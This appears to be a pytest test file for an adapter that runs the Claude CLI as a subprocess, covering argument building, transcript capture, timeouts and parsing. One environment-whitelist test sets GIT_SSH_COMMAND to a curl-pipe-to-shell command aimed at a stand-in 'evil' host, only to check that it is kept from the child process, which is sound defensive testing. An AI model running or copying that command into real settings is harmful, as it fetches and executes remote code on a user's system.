"""TDD tests for the base adapter protocol + claude adapter.

Driven against the fake engine stub (fake_engine.py) so the whole module
runs with no network and no real engine CLI, except:

- the fixture-parser tests, which parse REAL captured claude transcripts
  (tests/rails/fixtures/claude-transcript*.txt, captured manually with a
  trivial "pong" prompt -- see the parser tests for what each showed), and
- the RAILS_REAL_ENGINE=1 gated test at the bottom, skipped by default/CI.
"""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

import pytest

import rails.adapters.base as base_mod
from rails.adapters.base import ParsedTranscript, SessionError, SessionResult
from rails.adapters.claude import ClaudeAdapter, parse_claude_transcript
from rails.config import RailsConfig

FIXTURES = Path(__file__).parent / "fixtures"
FIXTURE_SUCCESS = FIXTURES / "claude-transcript.txt"
FIXTURE_BUDGET_EXCEEDED = FIXTURES / "claude-transcript-budget-exceeded.txt"

ARGV_CWD = Path("/work/tree")
ARGV_OUT = Path("/work/tree/.rails-transcripts/run.out")


def make_config(**over) -> RailsConfig:
    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
    defaults.update(over)
    return RailsConfig(**defaults)


def stderr_sidecar(result: SessionResult) -> Path:
    """stderr goes to a sidecar log next to the .jsonl transcript."""
    return result.transcript_path.with_suffix(".stderr.log")


# --- build_argv: pure function ---------------------------------------------


def test_build_argv_exact():
    cfg = make_config(max_budget_usd=1.5)
    adapter = ClaudeAdapter(cfg, binary=["claude"])

    argv = adapter.build_argv("do the thing", cwd=ARGV_CWD, out_file=ARGV_OUT)

    # claude needs neither cwd (Popen sets it) nor out_file (stream-json on
    # stdout) -- both exist in the signature for the codex/gemini seam.
    assert argv == [
        "claude",
        "-p",
        "do the thing",
        "--setting-sources",
        "project,local",
        "--verbose",
        "--output-format",
        "stream-json",
        "--permission-mode",
        "acceptEdits",
        "--max-budget-usd",
        "1.5",
    ]


def test_build_argv_is_pure():
    adapter = ClaudeAdapter(make_config(), binary=["claude"])

    first = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)
    second = adapter.build_argv("hi", cwd=Path("/elsewhere"), out_file=Path("/elsewhere/o.out"))

    assert first == second  # no instance state mutated, no cwd/out_file leakage for claude


def test_build_argv_uses_custom_binary_override():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg, binary=["uv", "run", "claude"])

    argv = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[:3] == ["uv", "run", "claude"]
    assert argv[3] == "-p"


def test_default_binary_is_bare_claude():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg)

    assert adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)[0] == "claude"


# --- run(): fake-engine-driven behavior -------------------------------------


def test_run_ok_extracts_final_message_cost_and_transcript(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="ok")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert isinstance(result, SessionResult)
    assert result.engine == "claude"
    assert result.ok is True
    assert result.explicit_result is True
    assert result.raw_exit_code == 0
    assert result.final_message == "fake engine final message"
    assert result.cost_usd == pytest.approx(0.0123)
    assert result.duration_s > 0

    assert result.transcript_path.is_file()
    assert result.transcript_path.parent.name == ".rails-transcripts"
    contents = result.transcript_path.read_text()
    assert "fake engine final message" in contents
    assert '"total_cost_usd"' in contents


def test_run_fail_sets_ok_false_without_raising(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="fail")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0


def test_stderr_captured_in_sidecar_transcript_stays_pure_jsonl(fake_binary, tmp_cwd):
    """stderr is captured to <transcript>.stderr.log so diagnostics survive,
    while the .jsonl transcript stays machine-parseable line by line."""
    argv, extra_env = fake_binary(shape="claude", behavior="fail")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    sidecar = stderr_sidecar(result)
    assert sidecar.is_file()
    assert "fake engine reporting failure" in sidecar.read_text()

    for line in result.transcript_path.read_text().splitlines():
        if line.strip():
            json.loads(line)  # every transcript line is valid JSON


def test_run_exit_zero_without_result_event_is_ok_but_not_explicit(fake_binary, tmp_cwd):
    """An engine stream that exits 0 but never emits its terminal result
    event (crash-adjacent truncation, or an engine that simply has no such
    event) keeps ok=True -- exit code semantics are unchanged -- but
    explicit_result=False flags that the engine never *said* it finished.
    Task 6's loop should treat ok and not explicit_result as suspicious."""
    argv, extra_env = fake_binary(shape="claude", behavior="ok_no_result")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.raw_exit_code == 0
    assert result.explicit_result is False
    # fallback path: final message comes from the last assistant text block
    assert result.final_message == "fake engine final message"


def test_engine_without_terminal_result_concept_never_flags_explicit_result(fake_binary, tmp_cwd):
    """For engines that have NO terminal-result event at all (gemini),
    emits_terminal_result=False makes explicit_result always True so Task
    6's 'ok and not explicit_result is suspicious' heuristic can never
    false-flag them."""

    class NoTerminalResultAdapter(ClaudeAdapter):
        name = "noterm"
        emits_terminal_result = False

    argv, extra_env = fake_binary(shape="gemini", behavior="ok")
    adapter = NoTerminalResultAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.explicit_result is True


def test_run_survives_non_utf8_bytes_mid_stream(fake_binary, tmp_cwd):
    """A raw non-UTF-8 byte (0xff) between a valid event and the terminal
    result event must not kill the capture: every line still lands in the
    transcript (decoded with errors="replace") and the result event after
    the noise still parses. Before the errors="replace" fix, the decode
    error killed the pump thread silently: empty transcript, ok=True."""
    argv, extra_env = fake_binary(shape="claude", behavior="bad_utf8")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.explicit_result is True
    assert result.final_message == "fake engine final message"
    assert result.cost_usd == pytest.approx(0.0123)

    contents = result.transcript_path.read_text()
    assert contents.strip() != ""
    assert '"total_cost_usd"' in contents  # the event AFTER the noise was captured
    assert "�" in contents  # the noise line was kept (replaced), not dropped


def test_pump_thread_failure_surfaces_as_session_error(fake_binary, tmp_cwd, monkeypatch):
    """If transcript capture itself dies (disk full, closed stream, ...),
    the run must NOT masquerade as ok=True over a truncated drain -- it is
    a rails-side infrastructure failure, surfaced like a spawn failure."""
    argv, extra_env = fake_binary(shape="claude", behavior="ok")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    def boom(stream, write_line):
        raise RuntimeError("disk full")

    monkeypatch.setattr(base_mod, "_pump_stream", boom)

    with pytest.raises(SessionError, match="transcript capture failed"):
        adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)


def test_run_timeout_raises_session_error_quickly_and_kills_child(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="timeout")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    started = time.monotonic()
    with pytest.raises(SessionError):
        adapter.run("hello", cwd=tmp_cwd, timeout_s=2, extra_env=extra_env)
    elapsed = time.monotonic() - started

    assert elapsed < 10

    pid_file = tmp_cwd / "fake_engine.pid"
    for _ in range(20):
        if pid_file.exists():
            break
        time.sleep(0.05)
    assert pid_file.exists(), "fake engine never started / never wrote its pid"
    pid = int(pid_file.read_text())

    # The process (and its process group) must actually be dead, not merely
    # orphaned -- os.kill(pid, 0) raises ProcessLookupError for a dead pid.
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


def test_write_file_then_fail_files_persist_after_failed_run(fake_binary, tmp_cwd):
    """Task 6's same-worktree retry depends on this: an engine that edited
    files and THEN exited nonzero leaves its edits in the cwd -- the failed
    run must not vaporize partial work."""
    argv, extra_env = fake_binary(
        shape="claude", behavior="write_file:artifact.txt:partial work:fail"
    )
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0
    assert (tmp_cwd / "artifact.txt").read_text() == "partial work"


def test_env_whitelist_boundary_holds_through_adapter(fake_binary, tmp_cwd, monkeypatch):
    """The canary + GIT_SSH_COMMAND must not reach the child even though
    they're both set in the test process's os.environ -- proving the
    adapter builds the child env from RailsConfig.allowed_env(extra_env),
    never os.environ wholesale."""
    monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
    monkeypatch.setenv("GIT_SSH_COMMAND", "curl evil.sh | sh")
    argv, extra_env = fake_binary(shape="claude", behavior="echo_env")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    lines = [line for line in result.transcript_path.read_text().splitlines() if line.strip()]
    assert len(lines) == 1
    child_env = json.loads(lines[0])

    assert "PATH" in child_env
    assert "RAILS_TEST_CANARY" not in child_env
    assert "GIT_SSH_COMMAND" not in child_env


# --- parser: built against REAL captured fixtures ----------------------------


def test_parse_claude_transcript_success_fixture():
    """Parses tests/rails/fixtures/claude-transcript.txt, captured with
    `claude -p "Reply with exactly the word: pong" --setting-sources
    project,local --verbose --output-format stream-json --max-budget-usd
    0.25` in a scratch dir (actual cost $0.0436; local paths in the init
    event's cwd/memory_paths scrubbed, everything else verbatim).

    Happy path: the terminal `result` event has subtype "success",
    `is_error: false`, a `result` text field, and `total_cost_usd`.
    """
    parsed = parse_claude_transcript(FIXTURE_SUCCESS.read_text().splitlines())

    assert isinstance(parsed, ParsedTranscript)
    assert parsed.final_message == "pong"
    assert parsed.cost_usd == pytest.approx(0.043588)
    assert parsed.result_ok is True
    assert parsed.saw_result is True


def test_parse_claude_transcript_budget_exceeded_fixture():
    """Parses tests/rails/fixtures/claude-transcript-budget-exceeded.txt --
    hand-trimmed from an earlier real capture whose run hit its $0.05 budget
    cap mid-stream: the terminal `result` event has subtype
    "error_max_budget_usd", `is_error: true`, and NO `result` text field at
    all -- the model had already said "pong" in an `assistant` text block
    before the budget check fired. This pins the fallback path the parser
    contract describes ("fallback: last assistant text event").
    """
    parsed = parse_claude_transcript(FIXTURE_BUDGET_EXCEEDED.read_text().splitlines())

    assert parsed.final_message == "pong"  # fallback: from the assistant event, not `result`
    assert parsed.cost_usd == pytest.approx(0.202691)
    assert parsed.result_ok is False  # is_error: true on the real result event
    assert parsed.saw_result is True


def test_parse_claude_transcript_no_result_event():
    lines = [
        json.dumps(
            {"type": "assistant", "message": {"content": [{"type": "text", "text": "partial"}]}}
        )
    ]

    parsed = parse_claude_transcript(lines)

    assert parsed.final_message == "partial"
    assert parsed.cost_usd is None
    assert parsed.result_ok is True  # no result event seen -- exit code alone decides ok
    assert parsed.saw_result is False


# --- gated real-engine test --------------------------------------------------


@pytest.mark.skipif(
    os.environ.get("RAILS_REAL_ENGINE") != "1",
    reason="real engine run (spends real subscription budget) -- set RAILS_REAL_ENGINE=1 to run",
)
def test_real_claude_engine_says_pong(tmp_path):
    adapter = ClaudeAdapter(make_config(max_budget_usd=0.05))

    result = adapter.run("Reply with exactly the word: pong", cwd=tmp_path, timeout_s=60)

    assert "pong" in result.final_message.lower()
